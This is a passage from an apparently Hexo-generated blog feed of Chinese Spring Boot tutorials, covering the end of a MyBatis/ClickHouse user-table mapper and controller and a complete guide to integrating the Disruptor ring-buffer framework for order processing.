class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;user_name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userName&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;pass_word&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;passWord&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;phone&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;email&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;create_day&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;createDay&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="line">        id,user_name,pass_word,phone,email,create_day</span><br><span class="line">    <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;saveData&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.click.house.entity.UserInfo&quot;</span> &gt;</span></span><br><span class="line">        INSERT INTO cs_user_info</span><br><span class="line">        (id,user_name,pass_word,phone,email,create_day)</span><br><span class="line">        VALUES</span><br><span class="line">        (#&#123;id,jdbcType=INTEGER&#125;,#&#123;userName,jdbcType=VARCHAR&#125;,#&#123;passWord,jdbcType=VARCHAR&#125;,</span><br><span class="line">        #&#123;phone,jdbcType=VARCHAR&#125;,#&#123;email,jdbcType=VARCHAR&#125;,#&#123;createDay,jdbcType=VARCHAR&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.Integer&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;BaseResultMap&quot;</span>&gt;</span></span><br><span class="line">        select</span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;Base_Column_List&quot;</span> /&gt;</span></span><br><span class="line">        from cs_user_info</span><br><span class="line">        where id = #&#123;id,jdbcType=INTEGER&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectList&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;BaseResultMap&quot;</span> &gt;</span></span><br><span class="line">        select</span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;Base_Column_List&quot;</span> /&gt;</span></span><br><span class="line">        from cs_user_info</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里 create_day 是以字符串的方式在转换，这里需要注意下。</p>
<h2 id="控制层接口"><a href="#控制层接口" class="headerlink" title="控制层接口"></a>控制层接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfoController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserInfoService userInfoService ;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/saveData&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">saveData</span> <span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInfo</span> () ;</span><br><span class="line">        userInfo.setId(<span class="number">4</span>);</span><br><span class="line">        userInfo.setUserName(<span class="string">&quot;winter&quot;</span>);</span><br><span class="line">        userInfo.setPassWord(<span class="string">&quot;567&quot;</span>);</span><br><span class="line">        userInfo.setPhone(<span class="string">&quot;13977776789&quot;</span>);</span><br><span class="line">        userInfo.setEmail(<span class="string">&quot;winter&quot;</span>);</span><br><span class="line">        userInfo.setCreateDay(<span class="string">&quot;2020-02-20&quot;</span>);</span><br><span class="line">        userInfoService.saveData(userInfo);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;sus&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectById&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> UserInfo <span class="title function_">selectById</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userInfoService.selectById(<span class="number">1</span>) ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectList&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">selectList</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userInfoService.selectList() ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2集成三【Disruptor框架】</title>
    <url>/cnblogs.github.io/p/9240.html</url>
    <content><![CDATA[<p>在高并发系统中，传统的队列或锁机制往往无法满足极限情况下的性能需求。Disruptor 是由 LMAX 交易所开发的一种高性能并发框架，设计初衷就是为了解决高频金融交易中的并发处理问题。与传统的队列机制不同，Disruptor 采用环形缓冲区（RingBuffer）和无锁算法（Lock-Free Algorithm），最大程度地减少了线程上下文切换和内存屏障的开销，从而能够在高并发场景下提供极低的延迟和极高的吞吐量。</p>
<p><strong>Disruptor 的核心特性包括：</strong></p>
<ul>
<li>无锁设计：通过使用无锁算法，Disruptor 避免了传统锁机制的竞争问题，从而大幅提升了系统的吞吐量。</li>
<li>低延迟：Disruptor 可以在纳秒级别处理事件，确保系统在高并发场景下的极低延迟。</li>
<li>高吞吐量：由于无锁设计和高效的缓存使用，Disruptor 能够轻松处理每秒数百万级别的事件。</li>
<li>环形缓冲区：通过环形缓冲区，Disruptor 能够高效利用内存，并且避免了垃圾回收机制带来的性能损耗。</li>
</ul>
<h3 id="项目环境配置"><a href="#项目环境配置" class="headerlink" title="项目环境配置"></a>项目环境配置</h3><p>Maven 配置 (pom.xml)<br>首先，我们需要在 pom.xml 中引入必要的依赖项，包括 Spring Boot 和 Disruptor：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring Boot 相关依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Disruptor 依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lmax<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>disruptor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 其他依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Yaml 配置 (application.yml)<br>在 application.yml 中，我们可以进行一些常规的 Spring Boot 配置，例如端口号设置等：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">prefix:</span> <span class="string">classpath:/templates/</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.html</span></span><br></pre></td></tr></table></figure>

<h3 id="Disruptor-的核心实现"><a href="#Disruptor-的核心实现" class="headerlink" title="Disruptor 的核心实现"></a>Disruptor 的核心实现</h3><p>定义订单事件（OrderEvent）<br>首先，我们定义一个简单的订单事件类 OrderEvent，它将存储订单的基本信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderEvent</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String orderId;</span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> String status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义事件工厂（OrderEventFactory）事件工厂用于生成 OrderEvent 对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lmax.disruptor.EventFactory;</span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.entity.OrderEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderEventFactory</span> <span class="keyword">implements</span> <span class="title class_">EventFactory</span>&lt;OrderEvent&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> OrderEvent <span class="title function_">newInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OrderEvent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义事件处理器（OrderEventHandler）事件处理器是实际处理事件的地方。在这里，我们模拟订单处理的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.entity.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> com.lmax.disruptor.EventHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderEventHandler</span> <span class="keyword">implements</span> <span class="title class_">EventHandler</span>&lt;OrderEvent&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEvent</span><span class="params">(OrderEvent event, <span class="type">long</span> sequence, <span class="type">boolean</span> endOfBatch)</span> &#123;</span><br><span class="line">        <span class="comment">// 处理订单的具体业务逻辑</span></span><br><span class="line">        processOrder(event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(OrderEvent orderEvent)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟订单支付逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;处理订单: &quot;</span> + orderEvent.getOrderId() + <span class="string">&quot;, 用户: &quot;</span> + orderEvent.getUserId() + <span class="string">&quot;, 金额: &quot;</span> + orderEvent.getPrice());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 假设订单处理通过后更新订单状态</span></span><br><span class="line">        orderEvent.setStatus(<span class="string">&quot;已支付&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟库存扣减逻辑</span></span><br><span class="line">        reduceInventory(orderEvent);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;订单处理完成: &quot;</span> + orderEvent.getOrderId() + <span class="string">&quot; 状态: &quot;</span> + orderEvent.getStatus());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reduceInventory</span><span class="params">(OrderEvent orderEvent)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟库存扣减逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;扣减库存: 订单 &quot;</span> + orderEvent.getOrderId());</span><br><span class="line">        <span class="comment">// 假设库存扣减成功</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义生产者（OrderEventProducer）生产者负责将订单事件发布到 Disruptor 的 RingBuffer 中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.producer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.entity.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> com.lmax.disruptor.RingBuffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderEventProducer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RingBuffer&lt;OrderEvent&gt; ringBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderEventProducer</span><span class="params">(RingBuffer&lt;OrderEvent&gt; ringBuffer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ringBuffer = ringBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onData</span><span class="params">(String userId, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sequence</span> <span class="operator">=</span> ringBuffer.next();  <span class="comment">// 获取下一个序列号</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OrderEvent</span> <span class="variable">orderEvent</span> <span class="operator">=</span> ringBuffer.get(sequence); <span class="comment">// 获取事件对象</span></span><br><span class="line">            orderEvent.setOrderId(UUID.randomUUID().toString());</span><br><span class="line">            orderEvent.setUserId(userId);</span><br><span class="line">            orderEvent.setPrice(price);</span><br><span class="line">            orderEvent.setStatus(<span class="string">&quot;未支付&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ringBuffer.publish(sequence);  <span class="comment">// 发布事件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置 Disruptor 在 Spring Boot 中配置 Disruptor 并启动它：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lmax.disruptor.dsl.Disruptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.entity.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.factory.OrderEventFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DisruptorConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Disruptor&lt;OrderEvent&gt; <span class="title function_">disruptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">OrderEventFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderEventFactory</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">1024</span>; <span class="comment">// RingBuffer 大小</span></span><br><span class="line"></span><br><span class="line">        Disruptor&lt;OrderEvent&gt; disruptor = <span class="keyword">new</span> <span class="title class_">Disruptor</span>&lt;&gt;(factory, bufferSize, Executors.defaultThreadFactory());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绑定事件处理器</span></span><br><span class="line">        disruptor.handleEventsWith(<span class="keyword">new</span> <span class="title class_">OrderEventHandler</span>());</span><br><span class="line">        disruptor.start();</span><br><span class="line">        <span class="keyword">return</span> disruptor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OrderEventProducer <span class="title function_">orderEventProducer</span><span class="params">(Disruptor&lt;OrderEvent&gt; disruptor)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OrderEventProducer</span>(disruptor.getRingBuffer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生产订单事件,通过 REST API 接收订单请求，并将订单事件发布到 Disruptor：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.icoderoad.disruptor.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.icoderoad.disruptor.producer.OrderEventProducer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/orders&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderEventProducer orderEventProducer;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/create&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">createOrder</span><span class="params">(<span class="meta">@RequestBody</span> OrderRequest orderRequest)</span> &#123;</span><br><span class="line">        orderEventProducer.onData(orderRequest.getUserId(), orderRequest.getPrice());</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;订单创建成功，正在处理！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderRequest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserId</span><span class="params">(String userId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userId = userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="前端页面展示"><a href="#前端页面展示" class="headerlink" title="前端页面展示"></a>前端页面展示</h3><p>为了更直观地展示订单的创建，我们使用 Thymeleaf 模板引擎，配合 Bootstrap 构建一个简单的订单创建页面。<br>Thymeleaf 模板 (order.html)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>创建订单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>创建订单<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;orderForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;price&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-label&quot;</span>&gt;</span>价格<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;price&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;orderForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> price = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;price&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;/orders/create&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">price</span>: price&#125;),</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="title function_">alert</span>(data))</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>运行流程说明</strong></p>
<ul>
<li>当用户通过前端页面提交订单请求时，OrderController 接收到请求并调用 OrderEventProducer 发布订单事件。</li>
<li>订单事件发布到 Disruptor 的 RingBuffer 中，并自动触发 OrderEventHandler 的消费逻辑。</li>
<li>OrderEventHandler 处理订单的业务逻辑，包括支付处理、库存扣减等操作，并更新订单状态。</li>
<li>订单处理完成后，控制台输出相关处理信息。</li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2集成二【Jasypt框架】</title>
    <url>/cnblogs.github.io/p/c198.html</url>
